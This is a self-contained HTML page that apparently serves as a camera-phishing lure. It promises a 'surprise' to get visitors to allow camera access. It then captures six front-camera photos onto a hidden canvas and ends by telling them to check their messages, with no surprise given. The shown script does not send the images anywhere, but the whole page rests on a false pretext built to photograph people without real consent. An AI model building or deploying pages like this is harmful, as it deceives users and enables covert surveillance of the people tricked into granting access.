<!DOCTYPE html>
<html>
<head>
    <title>Click Allow to See Surprise</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s;
        }
        button:hover {
            background: #45a049;
            transform: scale(1.05);
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
            transform: scaleX(-1);
        }
        .status {
            font-size: 18px;
            margin: 15px 0;
            font-weight: bold;
            min-height: 30px;
        }
        .countdown {
            font-size: 20px;
            color: #FFD700;
            font-weight: bold;
            margin: 10px 0;
            min-height: 30px;
        }
        .hidden {
            display: none;
        }
        .success {
            color: #4CAF50;
        }
        .error {
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Click Allow to See Surprise!</h1>
        <p>We need camera access to show you a special surprise! Click the button below and then click "Allow" when your browser asks for camera permission.</p>
        
        <button onclick="startCamera()" id="startBtn">
            üì∏ Start Camera & Allow Access
        </button>
        
        <video id="video" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        
        <div class="status" id="status">Click the button above to start</div>
        <div class="countdown" id="countdown"></div>
    </div>

    <script>
        let stream = null;

        async function startCamera() {
            try {
                const startBtn = document.getElementById('startBtn');
                const status = document.getElementById('status');
                const countdown = document.getElementById('countdown');
                const video = document.getElementById('video');

                // Update UI
                status.innerHTML = "üîÑ Requesting camera access...";
                startBtn.disabled = true;
                startBtn.innerHTML = "‚è≥ Waiting for your permission...";

                // Request camera access
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: false
                });

                // Show camera feed
                video.srcObject = stream;
                video.classList.remove('hidden');
                
                status.innerHTML = "‚úÖ Camera access granted!";
                startBtn.style.display = 'none';

                // Start capturing photos
                await capturePhotos();

            } catch (error) {
                const status = document.getElementById('status');
                const startBtn = document.getElementById('startBtn');
                
                status.innerHTML = "‚ùå " + error.message;
                status.className = 'status error';
                
                startBtn.disabled = false;
                startBtn.innerHTML = "üîÑ Try Again";
                
                if (error.name === 'NotAllowedError') {
                    status.innerHTML = "‚ùå Camera access was denied. Please refresh and click 'Allow' when asked.";
                } else if (error.name === 'NotFoundError') {
                    status.innerHTML = "‚ùå No camera found on this device.";
                } else if (error.name === 'NotSupportedError') {
                    status.innerHTML = "‚ùå Your browser doesn't support camera access.";
                } else {
                    status.innerHTML = "‚ùå Error: " + error.message;
                }
            }
        }

        async function capturePhotos() {
            const status = document.getElementById('status');
            const countdown = document.getElementById('countdown');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            status.innerHTML = "üì∏ Starting photo capture...";

            for (let i = 1; i <= 6; i++) {
                countdown.innerHTML = `üîÑ Preparing to capture photo ${i}/6...`;
                
                // Wait 2 seconds between photos
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Set canvas size to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Capture the photo
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                countdown.innerHTML = `‚úÖ Photo ${i}/6 captured successfully!`;
                
                // Simulate processing
                await new Promise(resolve => setTimeout(resolve, 500));
            }

            status.innerHTML = "üéâ All photos captured successfully!";
            countdown.innerHTML = "üì± Your surprise is being processed...";
            countdown.className = 'countdown success';

            // Stop camera after completion
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Final message
            setTimeout(() => {
                countdown.innerHTML = "‚ú® Check your messages for the surprise!";
            }, 2000);
        }

        // Add click event listener for better mobile support
        document.getElementById('startBtn').addEventListener('click', startCamera);
    </script>
</body>
</html>
